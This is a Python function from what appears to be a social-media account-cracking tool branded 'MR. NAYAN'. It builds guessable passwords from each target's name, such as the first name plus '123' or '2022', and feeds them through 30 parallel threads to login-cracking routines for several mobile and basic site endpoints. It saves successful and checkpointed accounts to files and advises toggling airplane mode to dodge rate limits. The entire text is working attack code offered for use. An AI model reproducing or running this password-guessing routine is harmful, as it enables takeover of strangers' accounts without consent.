def passwrd():
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	print(f'          {m}N {k}A {h}Y {u}A {b}N {u}  Ã¢Ëœâ€¦  {b}E {u}N {h} J{k} O{m} Y{b}')
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	print(f'{h}âž¥âž¥âž£Total {h}Id{u}          : {h}'+str(len(id)))
	print(f'âž¥âž¥âž£Result {h}OK{u} Save In : {h}OK/%s {b}'%(okc))
	print(f'âž¥âž¥âž£Result {m}CP{b} Save In : {m}CP/%s {h}'%(cpc))
	print(f'âž¥âž¥âž£Airplane Mode on 10 Seconds For {h}1k{u} Idz')
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(f'\n\033[42m\033[1;31m                   [CRACK DONE ]                      \033[40m\033[00m\n')
	print(f'[{h}â€¢{u}]{h} OK : {h}%s '%(ok))
	print(f'âž¥âž¥âž£Result {h}OK{u} Save In : {h}OK/%s {b}'%(okc))
	print(f'{k}[{k}â€¢{h}]{k} CP : {k}%s{u} '%(cp))
	print(f'âž¥âž¥âž£Result {m}CP{b} Save In : {m}CP/%s {h}'%(cpc))
	print('')
	print('{k}âž¥âž¥âž£Continue Cracking Back ( Y/n ) ? ')
	woi = input('âž¥âž¥âž£\033[94mChoosee : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}âž¥âž¥âž£{k} Good Bye DadahhðŸ¥µðŸ¥µ{u} ')
		time.sleep(2)
		exit()
